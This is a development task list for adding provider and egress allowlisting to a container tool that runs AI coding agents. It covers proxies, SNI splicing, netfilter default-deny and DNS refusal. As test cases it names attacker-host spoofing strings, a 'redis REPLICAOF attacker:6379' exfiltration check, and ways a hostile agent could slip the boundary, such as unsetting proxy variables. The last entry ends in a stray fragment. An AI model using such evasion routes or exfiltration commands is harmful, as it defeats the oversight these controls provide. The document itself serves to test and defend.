# Tasks: Egress and Provider Control

**Input**: Design documents from `/specs/012-egress-provider-control/`

**Prerequisites**: [plan.md](./plan.md), [spec.md](./spec.md), [research.md](./research.md),
[data-model.md](./data-model.md), [contracts/egress-contract.md](./contracts/egress-contract.md),
[quickstart.md](./quickstart.md)

**Tests**: Included. This project's quality gate is a hard CI gate and the feature's core claims
(enforcement strength, `NO_PROXY` precedence, identity) are exactly the kind that pass in
appearance and fail in substance — the recurring failure shape in this repo is **a check that
passes while the thing it names is broken**.

## Format: `[ID] [P?] [Story] Description`

- **[P]**: Can run in parallel (different files, no dependencies)
- **[Story]**: US1 / US2 / US3

## Path Conventions

Single-file CLI. Nearly everything lands in `bin/agent-container`; tests in `bin/tests/`; docs in
`docs/`. There is no new module (plan, Structure decision).

---

## Scope decision carried from the plan — read before starting

**US3 / FR-010 is DEFERRED to after Feature 016**, for two independent reasons:

1. Durable egress records need a volume, and a **tenth** per-container volume is an identity
   migration, not an edit (research R9). The identity lock fails on it *by design*.
2. That store and its ingestion machinery are shared with Feature 016, which is the expected first
   mover (research R5). The dependency is **not** one-way: whichever feature ships the store first
   pays the migration, and the other consumes it.

US3's tasks are written below and marked deferred so the work is *recorded*, not forgotten. The
shipped scope of this feature is **US1 + US2** — both P1, neither depends on FR-010.

---

## Phase 1: Setup

**Purpose**: Pin the one genuinely open decision — which proxy — by running it, not reading about
it. This is the project's established pattern (Feature 010's opencode probe, this feature's R1).

- [X] T001 Capture the pre-feature identity baseline into `bin/tests/test_pure_logic.py` context: run `agent-container list --json` and record container name, port and the nine volume names in the scratchpad, so T033's diff has something to compare against (quickstart S1)
- [X] T002 Evaluate candidate forward-proxy images against C3's four hard criteria — allowlists on the `CONNECT` target, **refuses with a status rather than dropping**, runs **rootless**, injects **no CA certificate** — and record the result plus rejected candidates in `specs/012-egress-provider-control/research.md` as R10
- [X] T002a Re-run the **Constitution VI** justification against the image T002 actually chose, and record it in `plan.md`'s Complexity Tracking. The current entry justifies "a proxy image" generically; VI requires every dependency earn its place, which cannot be assessed against a placeholder — image size, provenance, maintenance status and update cadence are all properties of the concrete choice
- [X] T003 Prove the chosen image satisfies C3 **by running it**: start it with a one-host allowlist, `curl` an allowed host (expect success) and a disallowed host (expect **curl exit 56**, never `%{http_code}` — R10a measured that it reads `000` for a refusal and a drop alike), and confirm with `tcpdump`/handshake inspection that the TLS session is end-to-end. Record the transcript in R10

**Checkpoint**: the proxy is chosen on evidence, and the R1a risk (drop vs refuse) is closed.

---

## Phase 2: Foundational (blocking prerequisites)

**Purpose**: The facts and the schema every story rests on. Nothing in US1 or US2 can be built or
tested without these.

- [X] T004 [P] Add the provider→hosts mapping table (`PROVIDERS`) to `bin/agent-container`, versioned with the tool, covering the providers the four supported agents use (research R6, data-model §1)
- [X] T005 [P] Add the built-in-default-provider fixture (`AGENT_BUILTIN_DEFAULT`) to `bin/agent-container`, one entry per member of `AGENTS`, recording whether the agent answers with no operator credential and which provider it reaches (data-model §3; opencode's value is Feature 010's probe result)
- [X] T006 [P] Add the proxy-adherence fixture (`AGENT_HONOURS_PROXY`) to `bin/agent-container`, one entry per member of `AGENTS`, all four `True` per research R1 (data-model §4)
- [X] T007 Add cross-file agreement tests in `bin/tests/test_pure_logic.py` proving `AGENT_BUILTIN_DEFAULT` and `AGENT_HONOURS_PROXY` each cover **exactly** `AGENTS` — a fifth agent added without probing must **fail**, and must default to *not known to honour* so `strict` refuses it
- [X] T008 Add a proof in `bin/tests/test_guards_can_fail.py` that T007's guard actually fails on drift: append a synthetic fifth agent to `AGENTS` in a copy and assert the guard raises. The repo's recurring failure is a guard that passes while the thing it names is broken
- [X] T009 Extend `validate_environment` in `bin/agent-container` with the optional `egress` key: `providers` (a list whose entries are **either** a known name **or** a `{name, hosts}` mapping, FR-001a) and `enforcement` (via `_enum_field`), dying before any action and naming the offending file+field (contract C1)
- [X] T009a Implement the **replacement** semantics in `bin/agent-container`: where an entry carries `hosts:`, the tool's mapping for that entry is **discarded**, not extended (FR-001b, research R6a)
- [X] T009b Reject malformed host lists in `bin/agent-container` — an entry with a scheme, path or port must `die` naming the field rather than being accepted and then never matching (contract C1)
- [X] T010 Add schema tests in `bin/tests/test_agent_as_code.py` for every C1 row: `egress` not a mapping, `providers` a bare **string** (must die naming the field, **not** iterate characters), unknown name in short form (dies listing the known set), unknown name in **long** form (**accepted** — hosts are authoritative), long form without `hosts` (dies), a URL in `hosts` (dies), unknown key inside a provider mapping, unknown key inside `egress`, bad `enforcement` enum
- [X] T010a Add a test in `bin/tests/test_compose.py` proving `hosts:` **replaces** rather than extends: declaring `{name: anthropic, hosts: [gw.corp]}` must produce an allowlist containing `gw.corp` and **not** the vendor's own hosts. Additive-vs-replacing is invisible in a passing deployment, which is why it gets a test rather than a doc line (FR-001b)
- [X] T011 Add tests in `bin/tests/test_agent_as_code.py` pinning the **three distinct declaration states** — `egress` absent (unrestricted), `providers: []` (air-gapped), `providers: [x]` (constrained). Absent must **never** coerce to empty; that would turn every existing environment air-gapped on upgrade (data-model §2)

**Checkpoint**: the schema accepts and rejects correctly; the per-agent facts are enforced by tests
rather than by comments.

---

## Phase 3: User Story 1 — Declare which providers an environment may use (P1)

**Goal**: A declared provider set is enforced by a proxy the tool deploys; anything undeclared is
refused rather than silently allowed.

**Independent test**: declare one provider, confirm the agent reaches it normally, then confirm an
undeclared provider does not succeed silently (quickstart S2, S3).

### Blockers found by the Phase 3 design fan-out — settle these first

Each was **verified against the real code**, not inferred. They change signatures, so they precede
T012.

- [X] T011a **Decide and record the single mechanism by which `up` sees the declaration.** `do_up` (`bin/agent-container:3126`) never calls `load_project_spec`; the declaration lives only on the `apply` path. Yet quickstart S2/S4/S6/S8 all drive the feature via `agent-container up dev`. Three design agents proposed three incompatible mechanisms. Every downstream signature depends on this — T012's parameter, T019's location, T021's call site, T022's log point. **Decide before writing code**, and cover `do_redeploy` (`:3387`), which duplicates the precheck sequence rather than routing through `do_up`
- [X] T011b Create `image/egress/` — Dockerfile (Alpine + tinyproxy, uid 65534) and `.dockerignore`. **It does not exist**; T002/T003 evaluated and chose it but committed no artifact, so any enforceability predicate keyed on its presence is vacuously false today. Use `FilterType` (not the deprecated `FilterExtended`) and drop `FilterCaseSensitive Off`, which is a documented no-op
- [X] T011c Generate filter entries **anchored and escaped** — `^<re.escape(host)>$`. tinyproxy matches filter lines with `regexec` **unanchored**, so a bare `api.anthropic.com` also permits `api.anthropic.com.attacker.net`. **This is the security boundary of the whole feature**; it gets its own test with that exact attacker string
- [X] T011d Cap total hostname length in `HOSTNAME_RE` (`:4971`). It accepts a **731-character** host (verified) because the label group repeats unbounded; tinyproxy reads its filter with a 512-byte `fgets` and regcomps each chunk, so one over-long entry becomes a prefix pattern **plus** a suffix pattern — silent over-permission reachable through the FR-001a `hosts:` path
- [X] T011e Replace `_yaml_service_keys` (`:2240`) with `yaml.safe_load`. The column-0 regex scanner returns `[]` for `services: {agent: {...}}` (flow style) and for a quoted `"agent":` key — both verified — so an operator override can set `agent.environment.NO_PROXY`, win the merge as the second `-f`, and defeat C6 entirely. PyYAML is already the sanctioned dependency
- [X] T011f Make `resolve_provider_hosts` unable to confuse **absent** with **empty**, and refuse the fourth state (`egress:` with `enforcement:` but no `providers`) — data-model §2. Presence must live in the type, not in one caller's discipline
- [X] T011g Add the effective allowlist to drift detection. `env_reconcile`/`env_desired_config` (`:5237`) compare only mode/agent/clone-url, so editing `egress.providers` and re-running `apply` reports **matching** and never redeploys — the declaration changes and the running proxy does not. Hostnames only, never a credential
- [X] T011h Keep the proxy container out of the environment-scanning surface. Compose names an unnamed service's container `<project>-<service>-1` → `agent-container-acme-egress-1`, which starts with `CONTAINER_PREFIX`; **six** sites treat any `agent-container-*` container as an environment (`:1104`, `:2674`, `:3481`, `:3511`, `:2700`, and the wizard pickers)
- [X] T011i Ensure teardown covers the proxy on the **fallback** path. `down_container` (`:3210`) issues a project-scoped `compose down`, but its fallback (`:3229`) does `rm -f <container_name(name)>` plus explicit volume removal — that branch strands a proxy container

### Compose model

- [X] T012 [US1] Extend `build_compose_model` in `bin/agent-container` to emit a second `egress` service — with the allowlist derived from the declaration — **only** when a declaration is present and enforceable (contract C2)
- [X] T013 [US1] Set `HTTPS_PROXY`/`HTTP_PROXY` on the `agent` service in `build_compose_model` to point at the `egress` service (contract C2, FR-007a)
- [X] T014 [US1] Add a test in `bin/tests/test_compose.py` proving the generated model is **byte-identical to today** when no declaration is present — the FR-004/FR-012 guarantee that existing environments keep working
- [X] T015 [US1] Add tests in `bin/tests/test_compose.py` proving the `egress` service appears with the right allowlist for a non-empty declaration, and appears with an **empty** allowlist for `providers: []` (FR-011 — zero providers is coherent, not degenerate)
- [ ] ~~T016~~ **DROPPED** — contradicted by T020e, which deliberately inspects the override to detect proxy redefinition. Keeping both would pin "never look at the override" against "look at the override". The surviving half (proxy is emitted into the *generated* file) is covered by T014/T015. Original text: add a test proving the proxy is emitted into the generated file and that `resolve_sidecar_override` is untouched — the operator's `<name>.services.yaml` stays operator-owned and still rides as the second `-f` on top (research R4)
- [X] T017 [US1] Add a test in `bin/tests/test_pure_logic.py` proving the identity is unchanged: nine volumes, same names, same container name, same port. A tenth volume means FR-010 leaked into this feature (research R9)

### `NO_PROXY` — the silent-failure case

- [X] T018 [US1] Make the tool set `NO_PROXY` itself, to the minimum needed for in-container traffic, in `bin/agent-container` (contract C6, research R3)
- [X] T019 [US1] Refuse **any** operator-supplied `NO_PROXY` while a declaration is enforced, naming the file and the variable, in `bin/agent-container`. **Attempt no subset comparison** — a "is this wider?" check across `*`, `.suffix`, IP, CIDR and port forms would err permissively and reproduce the bypass it exists to prevent (contract C6, research R3)
- [X] T020 [US1] Add tests in `bin/tests/test_compose.py` for C6's two rows — any operator `NO_PROXY` under an enforced declaration (refused, names the file), and no declaration (tool sets nothing). Present-or-absent, not a comparison. This is the feature's most likely silent failure and gets its own test, not a doc line

### Enforcement mode

- [X] T021 [US1] Implement the `advisory` / `strict` decision in `bin/agent-container`: advisory deploys and states the declaration is unenforced; strict refuses, naming the agent and why (FR-007b, data-model §5)
- [X] T022 [US1] Make the **effective** mode visible before deploying, in `bin/agent-container` (FR-007b)
- [X] T023 [P] [US1] Add tests in `bin/tests/test_agent_as_code.py` covering the four cells of data-model §5's mode table, including strict refusing on a proxy that cannot start (SC-004a — zero deployments proceeding with an unenforceable declaration)

### All egress, not just providers (scope decision, 2026-08-04)

- [X] T020a [US1] Implement `egress.allow` in `bin/agent-container` — non-provider hosts, with `*.domain` meaning domain-and-subdomains (FR-001c/FR-001d), folded into the same effective allowlist as `providers`
- [X] T020b [P] [US1] Add tests for `allow` in `bin/tests/test_agent_as_code.py`: plain host, `*.` form, and that `*.example.com` does **not** match `example.com.attacker.net`
- [X] T020c [US1] **Refuse or warn at deploy when HTTPS push is configured and the remote's host is not in the effective allowlist** (FR-003c) — refuse under `strict`, warn under `advisory`, naming the host to add. **This is the task that protects Hard Constraint #1.** Verified by probe: under `providers: [anthropic]`, `git ls-remote https://github.com/…` returns `CONNECT tunnel failed, response 403`
- [X] T020d [P] [US1] Add a test in `bin/tests/test_compose.py` proving T020c fires for an HTTPS remote absent from the allowlist and stays silent for an SSH remote (which ignores `https_proxy`) or when the host is declared
- [X] T020e [US1] Report an operator override that redefines the `egress` service, set `enforced` false, and refuse under `strict` (contract C2). Permitted but never silent — claiming enforcement for a proxy the tool did not configure is the overclaim SC-004 exists to prevent

### Error attribution

- [X] T023a [US1] Implement FR-003b as an **ordering-and-vocabulary invariant**, not a new check: credential resolution already fails naming the credential and its source, so ensure the egress code cannot re-attribute that failure to the `egress` declaration, and thread environment context into the message. **Do NOT infer that a declared provider requires a credential** — no such mapping exists (`PROVIDERS` is provider→hosts; `CRED_PROVIDER` is credential→provider for delivery routing and covers 2 of 5), and any inference false-positives on a provider reached without one, which is the very case Feature 010 found
- [X] T023b [P] [US1] Add a **negative** test in `bin/tests/test_credentialing.py`: a credential failure names the credential and its source and mentions neither `egress` nor any provider name (FR-003b)

### Lifecycle

- [X] T024 [US1] Verify `down`, `redeploy` and `wipe` tear the proxy down with no new step, because it shares the compose project — add the assertion to `bin/tests/test_lifecycle.py` (contract C2, quickstart S9)
- [X] T025 [US1] Handle the headless-foreground consequence in `bin/agent-container`: `--abort-on-container-exit --exit-code-from agent` stops every service when any exits, so a crashing proxy aborts the run. Fail-closed and correct — **state it** in `docs/execution.md` rather than let a headless user discover it (research R4)

**Checkpoint**: US1 is independently deliverable and testable. Run quickstart S2, S3, S5, S6, S9.

---

## Phase 4: User Story 2 — The default-provider path is explicit (P1)

**Goal**: An operator learns that an agent has a built-in provider it will reach without their
credential — the specific defect that motivated the feature — rather than discovering it from
traffic.

**Independent test**: with no credential and no declaration, confirm the tool states that the
selected agent has a built-in default and what that implies (quickstart S4).

- [X] T026 [US2] Emit the disclosure at deploy, **once**, for an environment with no declaration whose agent has a built-in default, in `bin/agent-container` — stating that the agent can reach a provider without the operator's credential, **which** provider where known, and that `egress.providers` is how to constrain it (contract C4, FR-006)
- [X] T027 [US2] Add tests in `bin/tests/test_cli.py` proving the disclosure fires when there is no declaration **and** the agent has a default, and does **not** fire when a declaration exists or the agent has no default — noise trains operators to ignore it (contract C4)
- [X] T027a [US2] Report at **deploy time** when the selected agent's built-in default provider is **not in the declared set**, in `bin/agent-container` (FR-003a). Both facts are known without running the agent, so waiting for a runtime refusal would be withholding. Covers spec US2 acceptance scenario 2, which had no task
- [X] T027b [P] [US2] Add a test in `bin/tests/test_cli.py` for T027a — fires when the default is outside the declared set, silent when it is inside or when nothing is declared (FR-003a)
- [X] T028 [US2] Implement the enforcement-strength statement in `bin/agent-container`: a proxy refuses clients that honour it, does **not** stop a process that dials directly, and **which** agents are known to honour it — currently all four (contract C5, FR-008)
- [X] T029 [US2] Add a test in `bin/tests/test_cli.py` asserting the strength statement names the adherence set and contains **no** phrasing implying packet-level or absolute enforcement. SC-004's failure mode is satisfying the requirement in appearance
- [X] T030 [P] [US2] Extend the `--json` envelope in `bin/agent-container` with `egress.providers`, `egress.hosts`, `egress.enforcement`, `egress.enforced`, `agent.builtin_default_provider`, `agent.honours_proxy` (contract C7, FR-005/FR-013). **NOTE (superseded in part by T112):** the flat `egress.hosts` list named here no longer exists — it was replaced by `egress.destinations`, whose entries carry `label`/`host`/`port`/`source`. It is emitted by NEITHER branch now: it used to survive in the undeclared branch alone, where an empty list read as "nothing is permitted" in the one case where everything is. A consumer still reading `.egress.hosts` gets `null`
- [X] T031 [P] [US2] Add tests in `bin/tests/test_agent_interface.py` proving the `--json` fields report the **effective** allowlist — including `host_source` — so an operator sees the mapping before a refusal rather than after, and an operator `hosts:` override is reflected rather than the tool's default (research R6/R6a, FR-001b). Reporting the default while enforcing an override would state a permission set the proxy does not enforce. **NOTE:** delivered, but `host_source` as a separate field is gone with the flat `hosts` list — each `destinations` entry carries its own `source` instead. The test asserts that shape (`test_agent_interface.py:416`)

**Checkpoint**: US2 is independently deliverable. Run quickstart S4, S7, S8.

---

## Phase 5: User Story 3 — Undeclared egress is recorded (P2) — **DEFERRED**

**Deferred to after Feature 016.** Recorded here so the work is tracked, not forgotten. Do **not**
implement in this feature: T033 would fail, correctly.

- [ ] T032 [US3] **DEFERRED** — Emit egress events from the proxy with the fields in data-model §6 (`timestamp`, `host`, `provider`, `declared`, `decision`) and **nothing more**: no headers, no bodies, no model names. The narrowness is Constitution III holding, not an omission
- [ ] T033 [US3] **DEFERRED** — Persist egress events into the durable per-container store and its ingestion machinery, under **their own schema** — not as rows in a run record, and not behind a tenth volume of this feature's own (research R9, FR-010). If that store does not yet exist, this task is **blocked**, not worked around
- [ ] T034 [US3] **DEFERRED** — Surface events through inspection with **no noise when nothing happened** — silence means nothing occurred (spec US3 scenario 3)

---

## Phase 6: Polish & Cross-Cutting

- [X] T035 [P] Write `docs/egress.md` covering the declaration, the three states, enforcement modes, the honest strength statement, and the `NO_PROXY` rule
- [X] T036 [P] Add the providers-vs-credentials distinction to `docs/credentials.md` — declaring a provider must not imply storing its credential in the project (FR-009); they are neighbours in the file, not a hierarchy
- [X] T037 [P] Update `docs/agent-as-code.md` with the `egress:` block in the example spec
- [X] T038 Add at most a one-line invariant to `CLAUDE.md` and re-measure the token budget with a real tokenizer — the file is at 1999/2000 and prune-before-adding applies
- [X] T039 Add acceptance tests in `bin/tests/test_acceptance.py` for quickstart S3 (undeclared refused — assert **curl exit 56**, never `%{http_code}`, which reads `000` for a refusal *and* a drop alike; research R10a), S4 (disclosure), S6 (`NO_PROXY` refused), S10 (rootlessness unchanged) and S11 (a pre-feature environment deploys identically)
- [X] T039a Add a test in `bin/tests/test_credentialing.py` asserting **no credential value** appears in the generated compose model, the proxy's generated config, or `--json` output, for an environment declaring **both** providers and credentials. Seed a recognisable **sentinel** value through each credential source and assert its absence in every generated artifact. Asserting "no key-shaped string" would test the assertion's imagination; asserting a *known* value is absent tests the actual path (FR-009, SC-007)
- [X] T040 Re-run the identity check from T001 and diff against the baseline — nine volumes, same names, same port. **This is the blocking check**; if any name drifted, nothing else matters
- [X] T041 Run `scripts/quality-gate.sh` and the full acceptance tier, then verify every quickstart scenario S1–S11 by hand, **including the lettered ones** (S3a, S9a). Run the **whole** suite, not just the new tests — changing a shared contract is exactly when a pre-existing test still pins the old shape

---

## Dependencies

```text
Phase 1 (T001–T003)  ── proxy chosen by running it
        ↓
Phase 2 (T004–T011)  ── facts + schema; BLOCKS both stories
        ↓
   ┌────┴────┐
   ↓         ↓
Phase 3    Phase 4    ── US1 and US2 are INDEPENDENT after Phase 2
(US1)      (US2)
   └────┬────┘
        ↓
Phase 6 (T035–T041)  ── polish; T039a security, T040 blocking

Phase 5 (US3) ── DEFERRED, blocked on Feature 016
```

- **T003 blocks T012** — do not build the compose model around an unproven proxy.
- **T007/T008 block T021** — `strict` decides on the adherence fixture, so the fixture must be
  guarded before it is trusted.
- **T009 blocks everything in Phase 3 and 4** — nothing can read a declaration that does not parse.
- **T017 and T040 are the same check** at start and end. T040 is blocking.

## Parallel opportunities

| Batch | Tasks | Why safe |
|---|---|---|
| Foundational facts | T004, T005, T006 | three independent tables, no shared logic |
| US2 machine-readable | T030, T031 | separate file from the prose output |
| Docs | T035, T036, T037 | three separate files |

US1 and US2 can be worked by different people in parallel once Phase 2 lands — they touch
different code paths (compose model vs. output/JSON).

## Implementation strategy

**MVP = Phase 1 + Phase 2 + Phase 3 (US1).** That gives a declared, enforced provider set. It is
useful alone, and it is where all the risk lives.

**Increment 2 = Phase 4 (US2).** Disclosure and the honest strength statement. Small, and it closes
the specific defect that motivated the feature.

**Increment 3 = Phase 5 (US3), after Feature 016.** Do not pull it forward to feel complete; the
cost is an identity migration plus an ingestion path that gets thrown away.

## Task count

| Phase | Tasks |
|---|---|
| 1 — Setup | 4 |
| 2 — Foundational | 11 |
| 3 — US1 | 30 |
| 4 — US2 | 8 |
| 5 — US3 (deferred) | 3 |
| 6 — Polish | 8 |
| **Total** | **64** (61 in scope, 3 deferred) |

---

# Phase B — transparent enforcement (US4/US5)

**IDs run from T100** so the phase boundary is unmistakable and cannot collide with a lettered
insertion above. Phase A's tasks are the delivered record and are not revisited.

**Read the plan's opening decision first**: FR-018b takes effect **with this phase**. Phase A's
two-key syntax stays correct until T112 migrates it — the delivered code is not broken in the
interim.

**Tests**: acceptance-heavy by necessity. US4's claim is about what a **hostile process cannot
do**, which no unit test can establish. Every evasion scenario drives the container adversarially.

---

## Phase 7 (B1): The image — prove the mechanism before building on it

**Purpose**: If SNI filtering without decryption does not work, this phase has no mechanism and
everything after it is wasted. Prove it first, as Phase A proved the proxy by running four of them.

- [X] T100 Create `image/egress/Dockerfile` for Phase B — Alpine + **squid 6.12** (`--with-openssl`, R12) + **`unbound`** (R16 — dnsmasq cannot return REFUSED, so it cannot satisfy FR-020e) + `iptables`, replacing tinyproxy. Keep the rootless posture for squid itself; only the entrypoint needs `NET_ADMIN`
- [X] T101 Write `image/egress/entrypoint.sh`: resolve the squid uid at **runtime** (never hard-coded), install the netfilter rules, start unbound, then **exec** squid so compose owns PID 1. Rules go in **before** squid starts — a window where the proxy is up and the rules are not is a window where the agent is unconstrained (R15)
- [X] T102 **Prove peek-and-splice end to end by running it**: an allowed SNI splices through and the client sees the **real server certificate**; a disallowed SNI is terminated. Record in research R12b. **If the client sees a proxy-generated certificate, stop** — that is `bump`, not `splice`, and it breaks R2/Constitution III
- [X] T103 Settle FR-020e by running dnsmasq: does `local=/#/` return **NXDOMAIN** or can it return **REFUSED**? NXDOMAIN says "no such host" where the truth is "policy", and the error path must not be designed around the wrong signal. Record in research R13a
- [X] T104 Verify the agent container's capability set is **unchanged** with `network_mode: service:egress` — `CapAdd: []` on the agent, `[NET_ADMIN]` on the proxy (SC-011, quickstart S16). **This is the blocking check for the whole phase**

**Checkpoint**: the mechanism exists and does not decrypt. Do not proceed without T102 and T104.

---

## Phase 8 (B2): Generation — one declaration, three surfaces

- [X] T105 Implement the unified `egress.allow` schema in `bin/agent-container` — entries `{provider}`, `{provider, hosts}`, `{host}`, `{host, port}` (FR-018a); **the port selects the enforcement surface**
- [X] T106 [P] Add schema tests in `bin/tests/test_agent_as_code.py` for all four entry shapes, plus a `{host, port}` with a non-integer port and a port outside 1–65535
- [X] T107 Render the **squid** allowlist from the declaration in `bin/agent-container`: bare host for exact, **leading dot** for subdomains, and **never quoted** — research R12a measured that a quoted entry is read as a FILE PATH and yields an acl with no entries
- [X] T108 [P] Add a test asserting the squid rendering is unquoted and uses the leading-dot form, and that `*.example.com` from Phase A's syntax is **translated, not passed through** (FR-018a)
- [X] T109 Render the **netfilter** rules from `{host, port}` entries in `bin/agent-container` — default-deny OUTPUT, REDIRECT 80/443 to squid, REDIRECT 53 to dnsmasq, explicit ACCEPT per declared host+port (FR-017/FR-018)
- [X] T110 [P] Add a test proving the generated ruleset **denies by default** — an undeclared port produces no ACCEPT rule, and the policy is DROP rather than ACCEPT. The first design sketch got this wrong, and default-accept is worse than no control
- [X] T111 Render the **dnsmasq** config from the same list in `bin/agent-container` — `local-zone: "." refuse` plus a per-name `forward-zone`, upstream from FR-020c's enumerated set (FR-020/FR-020b/FR-020c)
- [X] T112 Migrate Phase A's two-key syntax to the unified list (FR-018b) — **removed, not deprecated**. Update `validate_egress`, `validate_provider_entry`, `resolve_provider_hosts` and the ~15 tests that pin the old shape
- [X] T113 [P] Add a test proving a Phase A two-key declaration is **refused with a migration message naming the replacement**, not silently ignored — the FR-005 refuse-don't-ignore precedent
- [X] T114 Prove the three renderings agree: one declaration, three surfaces, and a test that a host declared once appears in **all three** (or, for a ported entry, in netfilter only). Drift between surfaces is the failure this unified schema exists to prevent

**Checkpoint**: one list generates three consistent surfaces; the old syntax migrates loudly.

---

## Phase 9: User Story 4 — enforcement the agent cannot switch off (P1)

**Goal**: the declaration holds even when the agent actively evades it.

**Independent test**: unset every proxy variable inside the container and reach an undeclared host —
it must fail (quickstart S12).

- [X] T115 [US4] Emit `network_mode: service:egress` on the agent service and `cap_add: [NET_ADMIN]` on the egress service in `build_compose_model` (FR-016/FR-019)
- [X] T116 [US4] **Move the published port binding to the egress service** — a shared namespace has one port owner. The port *number* is unchanged, so the identity lock still passes; this is an announced **migration**, not an edit (Constitution IV, plan)
- [X] T117 [US4] Add a test in `bin/tests/test_compose.py` pinning the new port ownership **and** asserting `port_for_name` is unchanged, so the migration is visible in exactly one place
- [X] T118 [US4] Handle the migration for **already-running Phase A environments** in `bin/agent-container`: detect the old shape and recreate rather than leave a container whose port the tool no longer owns
- [X] T119 [US4] Implement FR-021 — when transparent enforcement cannot be delivered on a host, fall back to Phase A's mechanism under `advisory` and refuse under `strict`, **naming which mode was obtained**. **Define the detection explicitly** (can the daemon grant `NET_ADMIN`? does `network_mode: service:` work on this runtime?) and prefer a positive probe over an assumption — an undetected failure silently downgrades to Phase A's strength while reporting the stronger one — **DONE, BUT NOT AS WRITTEN. The automatic fallback is deliberately NOT implemented; the requirement was amended instead (spec FR-021a).** What shipped is `egress_enforcement_mode()`, which returns `(mode, reason)` over exactly two modes — `transparent` and `none` — so the "name which mechanism you got" half is delivered and the "fall back to the proxy" half is refused. Two structural reasons, both recorded at the function: nothing rules out transparent enforcement **per agent** (it needs nothing from the agent, so there is no per-agent obstacle to fall back from), and every obstacle that remains — no image sources, an operator-redefined `egress` service — rules out the proxy **just as completely**, so there is nothing left to fall back *to*. Whether the daemon grants `NET_ADMIN` is not knowable pre-deploy, so the entrypoint **fails closed** rather than the tool guessing. A silent downgrade is the exact failure this feature exists to prevent, so the absence is the safe direction
- [X] T120 [US4] Place operator sidecars **inside** the boundary by default (FR-023), with an explicit opt-out (FR-023a) — **DONE.** `build_sidecar_boundary_overlay` emits `network_mode: service:egress` + `depends_on: service_healthy` for every service in the operator's override that is not named in `egress.sidecars_outside`, delivered as a **third `-f`** *after* the override so an operator's own `network_mode` cannot win. Returns `None` when there is nothing to place, so the argv for an environment without sidecars is unchanged. `sidecars_outside` lives in the **spec**, not the override — the override is operator-owned and an agent must not be able to move a service out of the boundary. Tests: `test_compose.py` (overlay contents, opt-out, ordering, `verify_sidecars_outside_resolve` refusing a name no override defines)
- [ ] T121 [US4] Name every out-of-boundary sidecar in the enforcement statement (FR-023b, **SC-015**) — otherwise `enforced: true` quietly means "except for these three containers", which is the overclaim SC-004 forbids wearing a different hat. **STATE: the naming is IMPLEMENTED and ASSERTED NOWHERE.** `do_up` warns `egress: <names> … outside the boundary` at deploy, beside the strength statement. But the only test claiming to cover SC-015 — `test_cli.py:505`, `assert "sidecars_outside" in s` — asserts that the literal *key name* occurs in the generic statement, which passes while no sidecar is ever named and the list is never consulted. It is also absent from `--json` (`egress_payload` has no `sidecars_outside` field), which T127a's acceptance arm would catch. Needs a unit assertion that the NAMES appear, keyed off a declaration that actually names one
- [X] T122 [US4] Extend `validate_sidecar_override` to check **egress posture**, not only shape (FR-023d) — it was cosmetic before this feature and is security-relevant after
- [X] T123 [US4] Ensure no automatic project-network allowance is granted (FR-023c) — that would be the hidden baseline FR-001e forbids, reintroduced by the back door — **DONE by construction, and that is the whole of it.** No generator emits a subnet or project-network ACCEPT: `build_netfilter_rules` renders only `-d '<host>' --dport <port>` per declared entry, and the entrypoint's own unconditional ACCEPTs are `-o lo`, `ESTABLISHED,RELATED`, the two `--uid-owner` daemon exemptions, and the loopback-scoped squid ports. **Unguarded, though:** `_rule_is_scoped` in `test_pure_logic.py` returns True for any rule without `--dport`, so a future `-d 172.18.0.0/16 -j ACCEPT` would pass every existing check. Worth a companion assertion that no ACCEPT carries a CIDR destination

### Evasion acceptance (US4) — the only tests that can establish the claim

- [X] T124 [US4] Acceptance: unset **every** proxy variable and reach an undeclared host — must fail (SC-008, quickstart S12). Under Phase A this **succeeds**; that difference is the feature
- [ ] T125 [US4] Acceptance: write proxy overrides into `~/.agent-env/env`, open a new shell, retry — must still fail. This is the hole Phase A had to *disclose* under FR-008a
- [X] T126 [US4] Acceptance: assert the agent container's capability set is **identical** to an undeclared environment's (SC-011, quickstart S16)
- [ ] T127a [US4] Acceptance: place a sidecar **outside** the boundary and assert it is **named** in the enforcement statement and in `--json` (SC-015). An unnamed exception is indistinguishable from a bug
- [ ] T127 [US4] Acceptance: drive a real `redis REPLICAOF attacker:6379` through an operator sidecar — must be refused (SC-014, quickstart S17). The agent needn't escape the namespace; it need only ask something that already has the access

**Checkpoint**: US4 is independently testable. Run quickstart S12, S16, S17.

---

## Phase 10: User Story 5 — every protocol and port declared, or it fails (P1)

**Goal**: default-deny across every port and protocol, with DNS closed as an exfiltration channel.

**Independent test**: declare one HTTPS provider; confirm SSH, FTP and an arbitrary high port all
fail, then declare SSH to one host and confirm only that host on that port opens (quickstart S13/S14).

- [X] T128 [US5] **DONE — but not as written; see research R19a.** The stated part (a), rewriting the agent's `/etc/resolv.conf`, is **not implementable and would not have sufficed**: the agent image ends `USER dev` and that file is a daemon-owned bind mount, and even with write access a rewrite is only ADVISORY — a hostile agent ignores it and queries `127.0.0.11` directly. Delivered instead by rewriting the PACKET in `image/egress/entrypoint.sh`: DNAT `127.0.0.11:53` to unbound, **INSERTED at the head of nat OUTPUT** (appended it is a dead rule — the daemon's own DNAT matches first, measured), plus a filter DROP for the ephemeral port behind it, which the dport-53 DNAT does not cover and which answered when asked directly. Measured: undeclared → REFUSED, declared → resolves, transparent undeclared → `curl` exit 6.
- [X] T129a [US5] **`EGRESS_PORT` 8888 → 3127 and the proxy target moved to loopback** (research R19b).
      8888 was Phase A's tinyproxy port; Phase B's squid forward-proxy port is 3127, so the diagnostic
      layer pointed at nothing and the symptom was an unreachable DECLARED destination — which reads as
      the allowlist being wrong. The target also named the service (`http://egress:8888`), making the
      proxy's own address depend on a DNS lookup the allowlist refuses (`curl` exit 5). The agent shares
      the sidecar's netns, so the proxy IS `127.0.0.1`. This resolves the exit 7 R19 left open.
- [X] T129b [US5] **DONE — cause found and fixed; see research R19c-resolved.** It was `http_access`, not `ssl_bump` and not SNI parsing: an intercepted TLS connection arrives as a synthesised CONNECT to the destination IP, so `dstdomain` cannot match and `deny all` fired before `ssl_bump` ran. Deferred to `ssl_bump` on that port via `acl tls_intercept myportname tlsintercept` — `myportname`, NOT `localport`, which never matches on an intercepted connection because squid reports the original port 443 and the scoping silently becomes a no-op. Proven to defer rather than permit by isolating it from DNS: a host unbound resolves but squid's ACL omits is still terminated (exit 35, no tunnel). Constitution III verified — declared host returns exit 0, i.e. curl verified the chain against public CAs, which the self-signed intercept cert cannot satisfy.
      host** (research R19c). Transparent path, no proxy variables: undeclared → `curl` exit 6 (the DNS
      allowlist holds) but **declared → exit 60, certificate problem**. squid logs
